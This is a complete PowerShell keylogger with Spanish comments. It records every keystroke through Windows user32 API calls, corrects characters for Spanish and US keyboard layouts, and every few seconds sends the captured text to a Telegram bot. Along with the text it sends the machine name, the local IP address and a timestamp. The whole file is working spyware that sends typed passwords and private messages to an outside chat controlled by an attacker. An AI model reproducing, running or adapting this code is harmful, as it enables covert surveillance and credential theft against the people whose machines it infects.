$Token = "$tg"
$PassPhrase = "$env:COMPUTERNAME"
$URL = 'https://api.telegram.org/bot{0}' -f $Token
$chatID = "6686157223"

# Espera hasta obtener el chat ID
while ($chatID.length -eq 0) {
    $updates = Invoke-RestMethod -Uri ($URL + "/getUpdates")
    if ($updates.ok -eq $true) {
        $latestUpdate = $updates.result[-1]
        if ($latestUpdate.message -ne $null) {
            $chatID = $latestUpdate.message.chat.id
        }
    }
    Sleep 10
}

Function Get-IP {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixLength -eq 24}).IPAddress
    return $ip
}

Function Get-KeyboardLayout {
    # Usamos la API de Windows para obtener el layout del teclado activo.
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class KeyboardLayout {
        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardLayout(int idThread);
    }
"@
    $layout = [KeyboardLayout]::GetKeyboardLayout(0)
    return $layout
}

Function KeyCapture {
    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chatID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : KeyCapture Started." -Force
    irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"

    $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
    $KeypressThreshold = [TimeSpan]::FromSeconds(10)
    $capturedKeys = ""

    # Detectar el layout del teclado
    $keyboardLayout = Get-KeyboardLayout

    While ($true) {
        $keyPressed = $false
        try {
            while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
                Start-Sleep -Milliseconds 30
                for ($asc = 8; $asc -le 254; $asc++) {
                    $keyst = $API::GetAsyncKeyState($asc)
                    if ($keyst -eq -32767) {
                        $keyPressed = $true
                        $LastKeypressTime.Restart()
                        $vtkey = $API::MapVirtualKey($asc, 3)
                        $kbst = New-Object Byte[] 256
                        $checkkbst = $API::GetKeyboardState($kbst)
                        $logchar = New-Object -TypeName System.Text.StringBuilder

                        # Verificamos si Shift está presionado
                        $shiftPressed = ($kbst[160] -band 0x80) -eq 0x80 -or ($kbst[161] -band 0x80) -eq 0x80

                        if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                            $LString = $logchar.ToString()

                            # Dependiendo del layout de teclado, ajustamos caracteres especiales
                            if ($keyboardLayout.ToString().ToUpper() -eq '040A040A') {  # Español (España) - se usa un código específico
                                if ($asc -eq 50) { $LString = "@" }
                                elseif ($asc -eq 56) { $LString = "*" }
                                elseif ($asc -eq 49) { $LString = "!" }
                                elseif ($asc -eq 51) { $LString = "#" }
                                elseif ($asc -eq 52) { $LString = "$" }
                                # Aquí puedes agregar más caracteres si es necesario
                            }
                            elseif ($keyboardLayout.ToString().ToUpper() -eq '04090409') {  # Inglés (Estados Unidos) - otro código
                                if ($asc -eq 50) { $LString = "@" }
                                elseif ($asc -eq 51) { $LString = "#" }
                                elseif ($asc -eq 52) { $LString = "$" }
                                elseif ($asc -eq 53) { $LString = "%" }
                                # Aquí puedes agregar más caracteres si es necesario
                            }

                            # Actualizamos el texto capturado con la tecla actual
                            if ($asc -eq 8) {
                                # Si es Backspace, eliminamos el último carácter
                                $capturedKeys = $capturedKeys.Substring(0, $capturedKeys.Length - 1)
                            } elseif ($asc -eq 13) {
                                # Si es Enter, añadimos un salto de línea
                                $capturedKeys += "`n"
                            } else {
                                # Añadimos cualquier otro carácter
                                $capturedKeys += $LString
                            }
                        }
                    }
                }
            }
        } finally {
            if ($keyPressed) {
                # Si hay teclas capturadas, las enviamos
                if ($capturedKeys.Length -gt 0) {
                    # Obtener IP y timestamp
                    $ip = Get-IP
                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    $escmsg = "Keys Captured at $timestamp from $env:COMPUTERNAME ($ip): " + $capturedKeys

                    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
                    irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
                    $capturedKeys = ""
                }
                $keyPressed = $false
            }
        }
        $LastKeypressTime.Restart()
        Start-Sleep -Milliseconds 10
    }
}

KeyCapture
